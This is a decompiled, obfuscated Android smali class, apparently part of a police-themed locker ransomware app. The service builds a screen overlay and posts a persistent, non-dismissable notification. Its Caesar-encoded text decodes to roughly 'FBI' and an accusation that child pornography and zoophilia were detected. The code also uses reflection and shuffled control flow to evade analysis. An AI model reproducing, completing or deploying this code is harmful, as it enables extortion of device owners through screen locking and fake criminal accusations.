.class public Lcom/EDzgPz/KwIOuS/dNuGTM;
.super Landroid/app/Service;


# instance fields
.field protected cancelNotification:Z

.field protected foreground:Z

.field protected id:I

.field private instance:Lcom/EDzgPz/KwIOuS/dNuGTM;

.field private overlayView:Lcom/EDzgPz/KwIOuS/lvjaxn;


# direct methods
.method public constructor <init>()V
    .locals 5

    .prologue
    nop

    goto :goto_5

    :goto_0
    nop

    return-void

    nop

    goto :goto_6

    :goto_1
    nop

    iput v0, p0, Lcom/EDzgPz/KwIOuS/dNuGTM;->id:I

    nop

    goto :goto_0

    :goto_2
    nop

    iput-boolean v0, p0, Lcom/EDzgPz/KwIOuS/dNuGTM;->cancelNotification:Z

    nop

    goto :goto_1

    :goto_3
    nop

    iput-boolean v0, p0, Lcom/EDzgPz/KwIOuS/dNuGTM;->foreground:Z

    nop

    goto :goto_2

    :goto_4
    nop

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    nop

    goto :goto_3

    :goto_5
    nop

    const/4 v0, 0x0

    nop

    goto :goto_4

    :goto_6
    nop

    nop
.end method

.method private xforegroundNotification(I)Landroid/app/Notification;
    .locals 9
    .param p1, "notificationId"    # I

    .prologue
    nop

    goto/16 :goto_d

    :goto_0
    nop

    return-object v0

    nop

    goto/16 :goto_e

    :goto_1
    nop

    const/4 v5, 0x4

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Landroid/content/Context;

    aput-object v8, v6, v5

    aput-object p0, v7, v5

    const/4 v5, 0x1

    const-class v8, Ljava/lang/CharSequence;

    aput-object v8, v6, v5

    aput-object v1, v7, v5

    const/4 v5, 0x2

    const-class v8, Ljava/lang/CharSequence;

    aput-object v8, v6, v5

    aput-object v2, v7, v5

    const/4 v5, 0x3

    const-class v8, Landroid/app/PendingIntent;

    aput-object v8, v6, v5

    aput-object v3, v7, v5

    const-string v5, "setLatestEventInfo"

    const-class v8, Landroid/app/Notification;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v0, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 v3, 0x0

    nop

    goto :goto_1

    :goto_3
    nop

    const-string v2, "Dijme]v312:t!qpso!boe![ppqijmjb!efufdufe"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_2

    :goto_4
    nop

    const-string v1, "GCJ"

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_3

    :goto_5
    nop

    iput v1, v0, Landroid/app/Notification;->flags:I

    nop

    goto :goto_4

    :goto_6
    nop

    or-int/lit8 v1, v1, 0x8

    nop

    goto :goto_5

    :goto_7
    nop

    or-int/lit8 v1, v1, 0x2

    nop

    goto :goto_6

    :goto_8
    nop

    iget v1, v0, Landroid/app/Notification;->flags:I

    nop

    goto :goto_7

    :goto_9
    nop

    invoke-direct {v0, v1, v2, v3, v4}, Landroid/app/Notification;-><init>(ILjava/lang/CharSequence;J)V

    nop

    goto :goto_8

    :goto_a
    nop

    const/4 v5, 0x0

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const-string v5, "currentTimeMillis"

    const-class v8, Ljava/lang/System;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    const/4 v8, 0x0

    invoke-virtual {v5, v8, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/Long;

    invoke-virtual {v5}, Ljava/lang/Long;->longValue()J

    move-result-wide v3

    nop

    goto :goto_9

    :goto_b
    nop

    const-string v2, "GCJ"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_a

    :goto_c
    nop

    const/high16 v1, 0x7f020000

    nop

    goto :goto_b

    :goto_d
    nop

    new-instance v0, Landroid/app/Notification;

    nop

    goto :goto_c

    :goto_e
    nop

    nop
.end method

.method private xmoveToBackground(I)V
    .locals 5
    .param p1, "id"    # I

    .prologue
    nop

    goto :goto_2

    :goto_0
    nop

    return-void

    nop

    goto :goto_3

    :goto_1
    nop

    invoke-virtual {p0, p1, v0}, Lcom/EDzgPz/KwIOuS/dNuGTM;->moveToBackground(IZ)V

    nop

    goto :goto_0

    :goto_2
    nop

    iget-boolean v0, p0, Lcom/EDzgPz/KwIOuS/dNuGTM;->cancelNotification:Z

    nop

    goto :goto_1

    :goto_3
    nop

    nop
.end method

.method private xmoveToBackground(IZ)V
    .locals 5
    .param p1, "id"    # I
    .param p2, "cancelNotification"    # Z

    .prologue
    nop

    goto :goto_4

    :goto_0
    nop

    return-void

    nop

    goto :goto_5

    :goto_1
    nop

    invoke-super {p0, p2}, Landroid/app/Service;->stopForeground(Z)V

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 p1, 0x0

    nop

    goto :goto_1

    :goto_3
    nop

    iput-boolean v0, p0, Lcom/EDzgPz/KwIOuS/dNuGTM;->foreground:Z

    nop

    goto :goto_2

    :goto_4
    nop

    const/4 v0, 0x0

    nop

    goto :goto_3

    :goto_5
    nop

    nop
.end method

.method private xmoveToForeground(ILandroid/app/Notification;Z)V
    .locals 5
    .param p1, "id"    # I
    .param p2, "notification"    # Landroid/app/Notification;
    .param p3, "cancelNotification"    # Z

    .prologue
    nop

    goto/16 :goto_12

    :goto_0
    nop

    goto :goto_a

    nop

    goto/16 :goto_13

    :goto_1
    nop

    const/4 v1, 0x2

    new-array v2, v1, [Ljava/lang/Class;

    new-array v3, v1, [Ljava/lang/Object;

    const/4 v1, 0x0

    sget-object v4, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v4, v2, v1

    new-instance v4, Ljava/lang/Integer;

    invoke-direct {v4, p1}, Ljava/lang/Integer;-><init>(I)V

    aput-object v4, v3, v1

    const/4 v1, 0x1

    const-class v4, Landroid/app/Notification;

    aput-object v4, v2, v1

    aput-object p2, v3, v1

    const-string v1, "notify"

    const-class v4, Landroid/app/NotificationManager;

    invoke-virtual {v4, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    invoke-virtual {v1, v0, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_0

    :goto_2
    nop

    check-cast v0, Landroid/app/NotificationManager;

    nop

    goto :goto_1

    :goto_3
    nop

    invoke-virtual {p0, v0}, Lcom/EDzgPz/KwIOuS/dNuGTM;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    nop

    goto :goto_2

    :goto_4
    nop

    const-string v0, "opujgjdbujpo"

    invoke-static/range {v0 .. v0}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    nop

    goto :goto_3

    :goto_5
    nop

    iput p1, p0, Lcom/EDzgPz/KwIOuS/dNuGTM;->id:I

    nop

    goto :goto_4

    :goto_6
    nop

    if-eqz p2, :cond_1

    nop

    goto :goto_5

    :goto_7
    nop

    if-lez p1, :cond_1

    nop

    goto :goto_6

    :goto_8
    nop

    if-eq v0, p1, :cond_1

    nop

    goto :goto_7

    :cond_0
    :goto_9
    nop

    iget v0, p0, Lcom/EDzgPz/KwIOuS/dNuGTM;->id:I

    nop

    goto :goto_8

    :cond_1
    :goto_a
    nop

    return-void

    nop

    goto :goto_9

    :goto_b
    nop

    invoke-super {p0, p1, p2}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    nop

    goto :goto_a

    :goto_c
    nop

    iput-boolean p3, p0, Lcom/EDzgPz/KwIOuS/dNuGTM;->cancelNotification:Z

    nop

    goto :goto_b

    :goto_d
    nop

    iput p1, p0, Lcom/EDzgPz/KwIOuS/dNuGTM;->id:I

    nop

    goto :goto_c

    :goto_e
    nop

    iput-boolean v0, p0, Lcom/EDzgPz/KwIOuS/dNuGTM;->foreground:Z

    nop

    goto :goto_d

    :goto_f
    nop

    const/4 v0, 0x1

    nop

    goto :goto_e

    :goto_10
    nop

    if-eqz p2, :cond_0

    nop

    goto :goto_f

    :goto_11
    nop

    if-nez v0, :cond_0

    nop

    goto :goto_10

    :goto_12
    nop

    iget-boolean v0, p0, Lcom/EDzgPz/KwIOuS/dNuGTM;->foreground:Z

    nop

    goto :goto_11

    :goto_13
    nop

    nop
.end method

.method private xmoveToForeground(IZ)V
    .locals 5
    .param p1, "id"    # I
    .param p2, "cancelNotification"    # Z

    .prologue
    nop

    goto :goto_2

    :goto_0
    nop

    return-void

    nop

    goto :goto_3

    :goto_1
    nop

    invoke-virtual {p0, p1, v0, p2}, Lcom/EDzgPz/KwIOuS/dNuGTM;->moveToForeground(ILandroid/app/Notification;Z)V

    nop

    goto :goto_0

    :goto_2
    nop

    invoke-virtual {p0, p1}, Lcom/EDzgPz/KwIOuS/dNuGTM;->foregroundNotification(I)Landroid/app/Notification;

    move-result-object v0

    nop

    goto :goto_1

    :goto_3
    nop

    nop
.end method

.method private xonBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 5
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    nop

    goto :goto_1

    :goto_0
    nop

    return-object v0

    nop

    goto :goto_2

    :goto_1
    nop

    const/4 v0, 0x0

    nop

    goto :goto_0

    :goto_2
    nop

    nop
.end method

.method private xonCreate()V
    .locals 5

    .prologue
    nop

    goto :goto_5

    :goto_0
    nop

    return-void

    nop

    goto :goto_6

    :goto_1
    nop

    iput-object v0, p0, Lcom/EDzgPz/KwIOuS/dNuGTM;->overlayView:Lcom/EDzgPz/KwIOuS/lvjaxn;

    nop

    goto :goto_0

    :goto_2
    nop

    invoke-direct {v0, p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;-><init>(Lcom/EDzgPz/KwIOuS/dNuGTM;)V

    nop

    goto :goto_1

    :goto_3
    nop

    new-instance v0, Lcom/EDzgPz/KwIOuS/lvjaxn;

    nop

    goto :goto_2

    :goto_4
    nop

    iput-object p0, p0, Lcom/EDzgPz/KwIOuS/dNuGTM;->instance:Lcom/EDzgPz/KwIOuS/dNuGTM;

    nop

    goto :goto_3

    :goto_5
    nop

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    nop

    goto :goto_4

    :goto_6
    nop

    nop
.end method

.method private xonStartCommand(Landroid/content/Intent;II)I
    .locals 9
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .prologue
    nop

    goto/16 :goto_16

    :cond_0
    :goto_0
    nop

    return v4

    nop

    goto/16 :goto_17

    :goto_1
    nop

    invoke-virtual {v2}, Lcom/EDzgPz/KwIOuS/lvjaxn;->refreshLayout()V

    nop

    goto :goto_0

    :goto_2
    nop

    iget-object v2, p0, Lcom/EDzgPz/KwIOuS/dNuGTM;->overlayView:Lcom/EDzgPz/KwIOuS/lvjaxn;

    nop

    goto :goto_1

    :goto_3
    nop

    if-eqz v2, :cond_0

    nop

    goto :goto_2

    :cond_1
    :goto_4
    nop

    iget-object v2, p0, Lcom/EDzgPz/KwIOuS/dNuGTM;->overlayView:Lcom/EDzgPz/KwIOuS/lvjaxn;

    nop

    goto :goto_3

    :goto_5
    nop

    const/4 v5, 0x1

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, v2}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const-string v5, "killProcess"

    const-class v8, Landroid/os/Process;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    const/4 v8, 0x0

    invoke-virtual {v5, v8, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_4

    :goto_6
    nop

    const/4 v5, 0x0

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const-string v5, "myPid"

    const-class v8, Landroid/os/Process;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    const/4 v8, 0x0

    invoke-virtual {v5, v8, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/Integer;

    invoke-virtual {v5}, Ljava/lang/Integer;->intValue()I

    move-result v2

    nop

    goto :goto_5

    :goto_7
    nop

    const/4 v5, 0x1

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, v3}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const-string v5, "cancel"

    const-class v8, Landroid/app/NotificationManager;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v2, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_6

    :goto_8
    nop

    iget v3, p0, Lcom/EDzgPz/KwIOuS/dNuGTM;->id:I

    nop

    goto :goto_7

    :goto_9
    nop

    check-cast v2, Landroid/app/NotificationManager;

    nop

    goto :goto_8

    :goto_a
    nop

    invoke-virtual {p0, v2}, Lcom/EDzgPz/KwIOuS/dNuGTM;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    nop

    goto :goto_9

    :goto_b
    nop

    const-string v2, "opujgjdbujpo"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_a

    :goto_c
    nop

    invoke-virtual {p0, v2, v4}, Lcom/EDzgPz/KwIOuS/dNuGTM;->moveToBackground(IZ)V

    nop

    goto :goto_b

    :goto_d
    nop

    iget v2, p0, Lcom/EDzgPz/KwIOuS/dNuGTM;->id:I

    nop

    goto :goto_c

    :goto_e
    nop

    iput-boolean v4, p0, Lcom/EDzgPz/KwIOuS/dNuGTM;->cancelNotification:Z

    nop

    goto :goto_d

    :goto_f
    nop

    if-eqz v1, :cond_1

    nop

    goto :goto_e

    :goto_10
    nop

    const/4 v5, 0x1

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v2, v7, v5

    const-string v5, "getString"

    const-class v8, Landroid/os/Bundle;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v0, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    nop

    goto :goto_f

    :goto_11
    nop

    const-string v2, "dmptf"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_10

    :cond_2
    :goto_12
    nop

    if-eqz v0, :cond_1

    nop

    goto :goto_11

    :goto_13
    nop

    const/4 v5, 0x0

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const-string v5, "getExtras"

    const-class v8, Landroid/content/Intent;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, p1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/Bundle;

    nop

    goto :goto_12

    :goto_14
    nop

    if-eqz p1, :cond_2

    nop

    goto :goto_13

    :goto_15
    nop

    const/4 v0, 0x0

    nop

    goto :goto_14

    :goto_16
    nop

    const/4 v4, 0x1

    nop

    goto :goto_15

    :goto_17
    nop

    nop
.end method


# virtual methods
.method protected foregroundNotification(I)Landroid/app/Notification;
    .locals 5

    invoke-direct {p0, p1}, Lcom/EDzgPz/KwIOuS/dNuGTM;->xforegroundNotification(I)Landroid/app/Notification;

    move-result-object v0

    return-object v0
.end method

.method public moveToBackground(I)V
    .locals 4

    invoke-direct {p0, p1}, Lcom/EDzgPz/KwIOuS/dNuGTM;->xmoveToBackground(I)V

    return-void
.end method

.method public moveToBackground(IZ)V
    .locals 4

    invoke-direct {p0, p1, p2}, Lcom/EDzgPz/KwIOuS/dNuGTM;->xmoveToBackground(IZ)V

    return-void
.end method

.method public moveToForeground(ILandroid/app/Notification;Z)V
    .locals 4

    invoke-direct {p0, p1, p2, p3}, Lcom/EDzgPz/KwIOuS/dNuGTM;->xmoveToForeground(ILandroid/app/Notification;Z)V

    return-void
.end method

.method public moveToForeground(IZ)V
    .locals 4

    invoke-direct {p0, p1, p2}, Lcom/EDzgPz/KwIOuS/dNuGTM;->xmoveToForeground(IZ)V

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 5

    invoke-direct {p0, p1}, Lcom/EDzgPz/KwIOuS/dNuGTM;->xonBind(Landroid/content/Intent;)Landroid/os/IBinder;

    move-result-object v0

    return-object v0
.end method

.method public onCreate()V
    .locals 4

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/dNuGTM;->xonCreate()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 5

    invoke-direct {p0, p1, p2, p3}, Lcom/EDzgPz/KwIOuS/dNuGTM;->xonStartCommand(Landroid/content/Intent;II)I

    move-result v0

    return v0
.end method
